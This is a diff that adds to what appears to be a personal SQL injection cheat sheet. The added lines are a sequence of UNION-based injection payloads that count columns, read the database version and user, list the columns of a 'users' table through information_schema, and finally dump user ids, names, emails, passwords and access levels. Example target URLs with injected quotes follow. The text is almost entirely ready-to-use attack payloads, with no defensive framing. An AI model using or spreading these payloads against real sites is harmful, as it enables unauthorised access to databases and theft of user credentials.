@@ -8,6 +8,17 @@ quote is data.
 Check for SQLi by adding the following to the end of a URL:
 a single quote
 ' or 1=1--<space>
+' order by 1-- -
+'union select 1,2,3,4,5,6,7,8-- -
+'union select 1,2,3,@@version,5,6,7,8-- -
+'union select 1,2,3,user(),5,6,7,8-- -
+'union select 1,2,3,column_name,5,6,7,8 from information_schema.columns where table_name='users'-- -
+'union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_name='users'-- -
+
+Return Result = user_id,first_name,last_name,email,pass,user_level,active,registration_date
+
+'union select 1,2,3,group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,email,0x3a,pass,0x3a,user_level),5,6,7,8 from users-- -
+
 
 http://www.target.com/index.php?id=100'
 http://www.target.com/index.php?id=100' or 1=1--<space>
